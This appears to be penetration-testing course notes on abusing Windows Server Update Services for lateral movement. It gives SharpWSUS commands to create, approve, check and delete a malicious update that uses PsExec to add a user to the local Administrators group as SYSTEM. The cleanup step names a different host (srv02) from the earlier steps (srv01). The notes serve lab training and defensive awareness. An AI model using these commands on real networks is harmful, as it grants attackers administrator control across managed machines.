## WSUS (Windows Server Update Services)

**WSUS (Windows Server Update Services)** is a Microsoft service that allows administrators to centrally distribute updates and patches for Microsoft products across an enterprise environment. It enables internal systems to receive updates **without requiring direct internet access**, improving control and scalability.

Access to WSUS requires **administrative privileges** on the WSUS server, typically membership in the **Administrators** or **WSUS Administrators** group. For lateral movement, the target system must be configured to **accept updates from the WSUS server**.

---

## WSUS Abuse for Lateral Movement

Attackers can abuse WSUS by delivering **malicious updates** to managed systems. While WSUS enforces a restriction that **only Microsoft‑signed binaries** can be deployed, this does not fully prevent abuse.

Some Microsoft‑signed binaries:

* Can execute arbitrary commands
* Can spawn child processes
* Run with **SYSTEM** privileges

This allows attackers to craft malicious updates using **LOLBins (Living Off the Land Binaries)** and push them to all systems managed by the WSUS server.

---

## SharpWSUS

[SharpWSUS](https://github.com/nettitude/SharpWSUS.git) is a tool used to **enumerate and exploit WSUS** for lateral movement.

### Attack Workflow

1. Create a malicious update
2. Approve the update for deployment
3. Wait for the target system to install the update
4. Clean up after execution

---

## SharpWSUS Usage

### Locate the WSUS Server

```
SharpWSUS.exe locate
```

---

### Inspect the WSUS Environment

Enumerates clients, servers, and existing update groups.

```
SharpWSUS.exe inspect
```

---

### Create a Malicious Update (Using PsExec)

```
.\SharpWSUS.exe create `
/payload:"C:\Tools\sysinternals\PSExec64.exe" `
/args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" `
/title:"NewAccountUpdate"
```

---

### Approve the Update for Deployment

```
.\SharpWSUS.exe approve `
/updateid:812772ce-0d8b-414b-823b-2cbc97d76126 `
/computername:srv01.inlanefreight.local `
/groupname:"FastUpdates"
```

---

### Check Update Installation Status

```
.\SharpWSUS.exe check `
/updateid:812772ce-0d8b-414b-823b-2cbc97d76126 `
/computername:srv01.inlanefreight.local
```

---

### Clean Up After Deployment

```
.\SharpWSUS.exe delete `
/updateid:812772ce-0d8b-414b-823b-2cbc97d76126 `
/computername:srv02.inlanefreight.local
```
